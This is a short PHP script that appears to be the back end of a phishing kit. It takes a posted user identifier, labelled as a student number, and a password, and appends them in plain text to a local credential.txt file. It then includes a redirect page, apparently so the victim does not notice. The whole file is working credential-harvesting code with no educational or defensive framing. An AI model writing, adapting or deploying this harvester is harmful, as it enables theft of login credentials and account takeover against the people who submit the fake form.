<?php
        $user = $_POST["user"];
        $password = $_POST["password"];
        $cred = 'Num etu: '.$user.'       Password: '. $password.PHP_EOL;
         
         $file = file_put_contents('./credential.txt', $cred.PHP_EOL, FILE_APPEND | LOCK_EX);
         include("./redirect.php");
         
      ?>
